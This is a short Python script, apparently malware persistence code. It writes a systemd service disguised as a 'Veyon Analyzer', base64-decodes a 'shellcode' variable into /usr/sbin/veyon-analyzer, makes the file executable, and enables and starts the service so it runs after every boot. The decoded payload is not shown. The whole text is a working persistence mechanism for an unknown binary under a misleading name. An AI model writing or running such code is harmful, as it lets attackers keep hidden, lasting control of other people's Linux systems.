with open("/etc/systemd/system/veyon-analyzer.service","w") as wf:
    prog = """
    [Unit]
    Description=Veyon Analyzer
    After=network.target

    [Service]
    ExecStart=/usr/sbin/veyon-analyzer
    ExecReload=/usr/sbin/veyon-analyzer
    Restart=always

    [Install]
    WantedBy=default.target
    RequiredBy=network.target
    """
    print(prog,file=wf)


import base64
my_bytes = shellcode.encode('ascii')
my_bytes = base64.b64decode(my_bytes)
with open("/usr/sbin/veyon-analyzer","wb") as wf:
    wf.write(my_bytes)

import os
os.system("chmod +x /usr/sbin/veyon-analyzer")
os.system("systemctl enable veyon-analyzer")
os.system("systemctl start veyon-analyzer")